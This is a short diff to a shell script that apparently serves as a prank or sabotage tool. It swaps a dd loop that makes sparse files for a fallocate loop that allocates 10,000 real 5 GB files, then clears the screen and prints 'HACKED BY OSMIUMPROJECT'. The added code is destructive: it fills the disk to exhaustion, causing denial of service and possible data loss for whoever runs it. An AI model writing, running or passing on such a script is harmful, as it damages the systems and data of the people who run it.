@@ -2,7 +2,9 @@
 
 random_number=$((RANDOM % 100))
 
-for i in {10000000000..1}; do dd if=/dev/zero of=5G$i$random_number.test bs=1 count=0 seek=5G; done
+for ((i=1; i<=10000; i++)); do
+    fallocate -l 5G "5GB_file_$i"
+done
 
 clear
 echo HACKED BY OSMIUMPROJECT
